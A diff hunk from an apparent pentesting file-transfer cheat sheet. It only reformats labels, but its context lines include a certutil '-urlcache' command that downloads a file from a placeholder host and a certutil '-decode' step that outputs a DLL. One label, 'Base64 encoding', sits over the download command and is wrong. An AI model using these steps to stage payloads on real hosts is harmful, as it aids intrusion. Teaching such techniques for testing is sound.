@@ -11,11 +11,11 @@ pyhton3 -m http.server <local_port>
 python -m pyftpdlib -p 21 --write
 ```
 ### Certutil
-// Base64 encoding
+Base64 encoding
 ```c
 certutil.exe -urlcache -split -f "http://<local_ip>/<file>" <file>
 ```
-// Base64 decoding
+Base64 decoding
 ```c
 certutil.exe -decode <file>.txt <file>.dll
 ```
